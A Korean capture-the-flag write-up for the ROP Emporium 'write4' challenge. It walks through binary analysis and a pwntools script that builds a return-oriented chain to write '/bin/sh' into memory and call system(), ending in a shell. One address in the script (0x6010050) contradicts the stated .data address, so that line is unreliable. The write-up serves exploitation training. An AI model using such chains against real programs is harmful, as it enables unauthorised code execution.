이번 문제는 <a href="https://ropemporium.com/challenge/write4.html">ROP emporium의</a> write4라는 문제입니다. 

문제를 제공한 웹사이트를 읽어보면 이번문제는 전 ROP emporium 에 있던 문제들과는 다르게 /bin/cat flag.txt 스트링이나 관련 함수가 
없다고 하네요.

그러면 결국 집적 스트링을 넣어주어여하는데 나중에 이 롸업을 업데이트 해줄때는 /bin/cat flag.txt를 문자열로 사용하겠지만 이번에는
그냥  /bin/sh 로  루트 권한을 얻는걸로 끝내겠습니다.

write4 checksec 결과
```
root@kali:~/pwn/write# checksec write4
[*] '/root/pwn/write/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

```

write4 radare2 결과
```
root@kali:~/pwn/write# radare2 write4
[0x00400650]> izz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x00000034 0x00000034   4  10 () utf16le @8\t@
001 0x00000238 0x00400238  27  28 (.interp) ascii /lib64/ld-linux-x86-64.so.2
002 0x00000292 0x00400292   4   5 (.note.gnu.build_id) ascii Fxf2
003 0x000003e9 0x004003e9   9  10 (.dynstr) ascii libc.so.6
004 0x000003f3 0x004003f3   4   5 (.dynstr) ascii puts
005 0x000003f8 0x004003f8   5   6 (.dynstr) ascii stdin
006 0x000003fe 0x004003fe   6   7 (.dynstr) ascii printf
007 0x00000405 0x00400405   5   6 (.dynstr) ascii fgets
008 0x0000040b 0x0040040b   6   7 (.dynstr) ascii memset
009 0x00000412 0x00400412   6   7 (.dynstr) ascii stdout
010 0x00000419 0x00400419   6   7 (.dynstr) ascii stderr
011 0x00000420 0x00400420   6   7 (.dynstr) ascii system
012 0x00000427 0x00400427   7   8 (.dynstr) ascii setvbuf
013 0x0000042f 0x0040042f  17  18 (.dynstr) ascii __libc_start_main
014 0x00000441 0x00400441  14  15 (.dynstr) ascii __gmon_start__
015 0x00000450 0x00400450  11  12 (.dynstr) ascii GLIBC_2.2.5
016 0x000005c1 0x004005c1   4   5 (.plt) ascii 5B\n 
017 0x000005c7 0x004005c7   4   5 (.plt) ascii %D\n 
018 0x000005d1 0x004005d1   4   5 (.plt) ascii %B\n 
019 0x000005e1 0x004005e1   4   5 (.plt) ascii %:\n 
020 0x000005f1 0x004005f1   4   5 (.plt) ascii %2\n 
021 0x00000601 0x00400601   4   5 (.plt) ascii %*\n 
022 0x00000611 0x00400611   4   5 (.plt) ascii %"\n 
023 0x00000685 0x00400685   4   5 (.text) ascii UH-`
024 0x00000830 0x00400830   5   6 (.text) ascii AWAVA
025 0x00000837 0x00400837   5   6 (.text) ascii AUATL
026 0x00000889 0x00400889  14  16 (.text)  utf8 \b[]A\A]A^A_Ðf. blocks=Basic Latin,Latin-1 Supplement
027 0x000008b8 0x004008b8  22  23 (.rodata) ascii write4 by ROP Emporium
028 0x000008cf 0x004008cf   7   8 (.rodata) ascii 64bits\n
029 0x000008d7 0x004008d7   8   9 (.rodata) ascii \nExiting
030 0x000008e0 0x004008e0  40  41 (.rodata) ascii Go ahead and give me the string already!
031 0x0000090c 0x0040090c   7   8 (.rodata) ascii /bin/ls
032 0x00000968 0x00400968   4   5 (.eh_frame) ascii \e\f\a\b
033 0x00000998 0x00400998   4   5 (.eh_frame) ascii \e\f\a\b
034 0x000009bf 0x004009bf   5   6 (.eh_frame) ascii ;*3$"
035 0x000009e2 0x004009e2   4   5 (.eh_frame) ascii j\f\a\b
036 0x00000a02 0x00400a02   4   5 (.eh_frame) ascii M\f\a\b
037 0x00000a21 0x00400a21   4   5 (.eh_frame) ascii L\f\a\b
038 0x00001060 0x00000000  51  52 (.comment) ascii GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
039 0x00001801 0x00000001  10  11 (.strtab) ascii crtstuff.c
040 0x0000180c 0x0000000c  12  13 (.strtab) ascii __JCR_LIST__
041 0x00001819 0x00000019  20  21 (.strtab) ascii deregister_tm_clones
042 0x0000182e 0x0000002e  21  22 (.strtab) ascii __do_global_dtors_aux
043 0x00001844 0x00000044  14  15 (.strtab) ascii completed.7585
044 0x00001853 0x00000053  38  39 (.strtab) ascii __do_global_dtors_aux_fini_array_entry
045 0x0000187a 0x0000007a  11  12 (.strtab) ascii frame_dummy
046 0x00001886 0x00000086  30  31 (.strtab) ascii __frame_dummy_init_array_entry
047 0x000018a5 0x000000a5   8   9 (.strtab) ascii write4.c
048 0x000018ae 0x000000ae   5   6 (.strtab) ascii pwnme
049 0x000018b4 0x000000b4  14  15 (.strtab) ascii usefulFunction
050 0x000018c3 0x000000c3  10  11 (.strtab) ascii write4.asm
051 0x000018ce 0x000000ce  13  14 (.strtab) ascii __FRAME_END__
052 0x000018dc 0x000000dc  11  12 (.strtab) ascii __JCR_END__
053 0x000018e8 0x000000e8  16  17 (.strtab) ascii __init_array_end
054 0x000018f9 0x000000f9   8   9 (.strtab) ascii _DYNAMIC
055 0x00001902 0x00000102  18  19 (.strtab) ascii __init_array_start
056 0x00001915 0x00000115  18  19 (.strtab) ascii __GNU_EH_FRAME_HDR
057 0x00001928 0x00000128  21  22 (.strtab) ascii _GLOBAL_OFFSET_TABLE_
058 0x0000193e 0x0000013e  15  16 (.strtab) ascii __libc_csu_fini
059 0x0000194e 0x0000014e  27  28 (.strtab) ascii _ITM_deregisterTMCloneTable
060 0x0000196a 0x0000016a  19  20 (.strtab) ascii stdout@@GLIBC_2.2.5
061 0x0000197e 0x0000017e  17  18 (.strtab) ascii puts@@GLIBC_2.2.5
062 0x00001990 0x00000190  18  19 (.strtab) ascii stdin@@GLIBC_2.2.5
063 0x000019a3 0x000001a3   6   7 (.strtab) ascii _edata
064 0x000019aa 0x000001aa  19  20 (.strtab) ascii system@@GLIBC_2.2.5
065 0x000019be 0x000001be  19  20 (.strtab) ascii printf@@GLIBC_2.2.5
066 0x000019d2 0x000001d2  19  20 (.strtab) ascii memset@@GLIBC_2.2.5
067 0x000019e6 0x000001e6  30  31 (.strtab) ascii __libc_start_main@@GLIBC_2.2.5
068 0x00001a05 0x00000205  18  19 (.strtab) ascii fgets@@GLIBC_2.2.5
069 0x00001a18 0x00000218  12  13 (.strtab) ascii __data_start
070 0x00001a25 0x00000225  14  15 (.strtab) ascii __gmon_start__
071 0x00001a34 0x00000234  12  13 (.strtab) ascii __dso_handle
072 0x00001a41 0x00000241  14  15 (.strtab) ascii _IO_stdin_used
073 0x00001a50 0x00000250  15  16 (.strtab) ascii __libc_csu_init
074 0x00001a60 0x00000260  11  12 (.strtab) ascii __bss_start
075 0x00001a6c 0x0000026c   4   5 (.strtab) ascii main
076 0x00001a71 0x00000271  20  21 (.strtab) ascii setvbuf@@GLIBC_2.2.5
077 0x00001a86 0x00000286  19  20 (.strtab) ascii _Jv_RegisterClasses
078 0x00001a9a 0x0000029a  13  14 (.strtab) ascii usefulGadgets
079 0x00001aa8 0x000002a8  11  12 (.strtab) ascii __TMC_END__
080 0x00001ab4 0x000002b4  25  26 (.strtab) ascii _ITM_registerTMCloneTable
081 0x00001ace 0x000002ce  19  20 (.strtab) ascii stderr@@GLIBC_2.2.5
082 0x00001ae3 0x00000001   7   8 (.shstrtab) ascii .symtab
083 0x00001aeb 0x00000009   7   8 (.shstrtab) ascii .strtab
084 0x00001af3 0x00000011   9  10 (.shstrtab) ascii .shstrtab
085 0x00001afd 0x0000001b   7   8 (.shstrtab) ascii .interp
086 0x00001b05 0x00000023  13  14 (.shstrtab) ascii .note.ABI-tag
087 0x00001b13 0x00000031  18  19 (.shstrtab) ascii .note.gnu.build-id
088 0x00001b26 0x00000044   9  10 (.shstrtab) ascii .gnu.hash
089 0x00001b30 0x0000004e   7   8 (.shstrtab) ascii .dynsym
090 0x00001b38 0x00000056   7   8 (.shstrtab) ascii .dynstr
091 0x00001b40 0x0000005e  12  13 (.shstrtab) ascii .gnu.version
092 0x00001b4d 0x0000006b  14  15 (.shstrtab) ascii .gnu.version_r
093 0x00001b5c 0x0000007a   9  10 (.shstrtab) ascii .rela.dyn
094 0x00001b66 0x00000084   9  10 (.shstrtab) ascii .rela.plt
095 0x00001b70 0x0000008e   5   6 (.shstrtab) ascii .init
096 0x00001b76 0x00000094   8   9 (.shstrtab) ascii .plt.got
097 0x00001b7f 0x0000009d   5   6 (.shstrtab) ascii .text
098 0x00001b85 0x000000a3   5   6 (.shstrtab) ascii .fini
099 0x00001b8b 0x000000a9   7   8 (.shstrtab) ascii .rodata
100 0x00001b93 0x000000b1  13  14 (.shstrtab) ascii .eh_frame_hdr
101 0x00001ba1 0x000000bf   9  10 (.shstrtab) ascii .eh_frame
102 0x00001bab 0x000000c9  11  12 (.shstrtab) ascii .init_array
103 0x00001bb7 0x000000d5  11  12 (.shstrtab) ascii .fini_array
104 0x00001bc3 0x000000e1   4   5 (.shstrtab) ascii .jcr
105 0x00001bc8 0x000000e6   8   9 (.shstrtab) ascii .dynamic
106 0x00001bd1 0x000000ef   8   9 (.shstrtab) ascii .got.plt
107 0x00001bda 0x000000f8   5   6 (.shstrtab) ascii .data
108 0x00001be0 0x000000fe   4   5 (.shstrtab) ascii .bss
109 0x00001be5 0x00000103   8   9 (.shstrtab) ascii .comment
```
checksec 으로 확인하면 nx 가 있기때문에 스택위에서 코드를 실행하는건 불가능하고 radare2 를 이용하면 전 문제들과 비슷하게 pwnme, usefulFunction 등등
있는것을 볼수 있습니다.

자 이제 해야할것은 /bin/sh 를 쓸 메모리 공간을 찾는 것인데 이것도 r2 를 사용하여 쉽게 할 수 있습니다.

r2 write 결과
```
root@kali:~/pwn/write# radare2 write4
[0x00400650]> iS
[Sections]
Nm Paddr       Size Vaddr      Memsz Perms Name
00 0x00000000     0 0x00000000     0 ---- 
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    48 0x00400298    48 -r-- .gnu.hash
05 0x000002c8   288 0x004002c8   288 -r-- .dynsym
06 0x000003e8   116 0x004003e8   116 -r-- .dynstr
07 0x0000045c    24 0x0040045c    24 -r-- .gnu.version
08 0x00000478    32 0x00400478    32 -r-- .gnu.version_r
09 0x00000498    96 0x00400498    96 -r-- .rela.dyn
10 0x000004f8   168 0x004004f8   168 -r-- .rela.plt
11 0x000005a0    26 0x004005a0    26 -r-x .init
12 0x000005c0   128 0x004005c0   128 -r-x .plt
13 0x00000640     8 0x00400640     8 -r-x .plt.got
14 0x00000650   594 0x00400650   594 -r-x .text
15 0x000008a4     9 0x004008a4     9 -r-x .fini
16 0x000008b0   100 0x004008b0   100 -r-- .rodata
17 0x00000914    68 0x00400914    68 -r-- .eh_frame_hdr
18 0x00000958   308 0x00400958   308 -r-- .eh_frame
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000    80 0x00601000    80 -rw- .got.plt
25 0x00001050    16 0x00601050    16 -rw- .data
26 0x00001060     0 0x00601060    48 -rw- .bss
27 0x00001060    52 0x00000000    52 ---- .comment
28 0x00001ae2   268 0x00000000   268 ---- .shstrtab
29 0x00001098  1896 0x00000000  1896 ---- .symtab
30 0x00001800   738 0x00000000   738 ---- .strtab
```
여기서 봐야할것은 w 퍼미션이 있어야겠죠. 좋은곳으로는 .bss 하고 .data 가 있는데 저는 .data 를 쓰겠습니다
.data 가 비어있는지는 readelf 를 사용하여 알 수 있습니다.

readelf 결과
```
root@kali:~/pwn/write# readelf -x .data write4

Hex dump of section '.data':
  0x00601050 00000000 00000000 00000000 00000000 ................
```
아무것도 없죠. 

이제 찾아야할것은 /bin/sh 를 .data 주소에 넣어주어여할 실행 코드를 찾아야합니다.
코드를 대충 생각해보면

> mov [r1], r2

이런 식으로 하면 /bin/sh 를 저 주소에 넣을 수 있겠죠.

ropper 결과
```
root@kali:~/pwn/write# ropper --file write4 --search "mov"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov

[INFO] File: write4
0x0000000000400821: mov dword ptr [rsi], edi; ret; 
0x00000000004007ae: mov eax, 0; pop rbp; ret; 
0x00000000004005b1: mov eax, dword ptr [rax]; add byte ptr [rax], al; add rsp, 8; ret; 
0x00000000004005a5: mov eax, dword ptr [rip + 0x200a4d]; test rax, rax; je 0x5b5; call 0x640; add rsp, 8; ret;                                                                                                    
0x000000000040073c: mov ebp, esp; call rax; 
0x0000000000400809: mov ebp, esp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret; 
0x00000000004007a4: mov edi, 0x4008d7; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x000000000040080b: mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret; 
0x00000000004006a0: mov edi, 0x601060; jmp rax; 
0x00000000004007fd: mov edi, eax; call 0x620; nop; leave; ret; 
0x0000000000400820: mov qword ptr [r14], r15; ret; 
0x00000000004005a4: mov rax, qword ptr [rip + 0x200a4d]; test rax, rax; je 0x5b5; call 0x640; add rsp, 8; ret;                                                                                                    
0x000000000040073b: mov rbp, rsp; call rax; 
0x0000000000400808: mov rbp, rsp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret; 
0x00000000004007fc: mov rdi, rax; call 0x620; nop; leave; ret; 
```

ropper 를 사용하면 0x0000000000400820 에 딱 맞는 코드가 있는 것을 확인 할 수 있습니다.
그럼 이제 r14 하고 r15에 값을 넣어 줄 수 있는 코드를 찾아야겠죠 

>pop r14; pop r15; ret; 

대충 이런식으로 생겼을 겁니다.\

ropper 실행결과
```
root@kali:~/pwn/write# ropper --file write4 --search "pop"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: write4
0x000000000040088c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040088e: pop r13; pop r14; pop r15; ret; 
0x0000000000400890: pop r14; pop r15; ret; 
0x0000000000400892: pop r15; ret; 
0x000000000040069f: pop rbp; mov edi, 0x601060; jmp rax; 
0x000000000040088b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040088f: pop rbp; pop r14; pop r15; ret; 
0x00000000004006b0: pop rbp; ret; 
0x0000000000400893: pop rdi; ret; 
0x0000000000400891: pop rsi; pop r15; ret; 
0x000000000040088d: pop rsp; pop r13; pop r14; pop r15; ret; 
```

그럼 또 0x0000000000400890 에 원하는 코드가 있는것을 알 수 있죠.

이제 system 주소와 system 에 들어갈 인자를 .data 주소로 바꾸기 위해서 calling convection으로 첫번째 인자는 항상 rdi 로 들어가기
때문에 pop rdi; ret 이런식의 코드를 찾으면 됩니다.

ropper 결과
```
root@kali:~/pwn/write# ropper --file write4 --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: write4
0x0000000000400893: pop rdi; ret; 
```

넵 여기있네요.

system의 주소는 0x400810 입니다.

이제 여태까지 모아온 정보로 파이썬 익스를 짜보면

파이썬 코드
```
from pwn import *

r = process("./write4")

payload = b"A"*40
payload += p64(0x400890)#pop r14, pop r15
payload += p64(0x6010050)#.data
payload += b"/bin/sh\x00"#code
payload += p64(0x400820)#mov [r14], r15
payload += p64(0x400893)#pop rdi
payload += p64(0x601050)
payload += p64(0x400810)

r.recvline()
r.sendline(payload)
print(r.recvline())
r.interactive()

```


실행결과
```
root@kali:~/pwn/write# python exploit.py 
[+] Starting program './write4': Done
[ERROR] Neither 'qemu-i386' nor 'qemu-i386-static' are available
b'64bits\n'
[*] Switching to interactive mode

Go ahead and give me the string already!
> $ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```
성공.
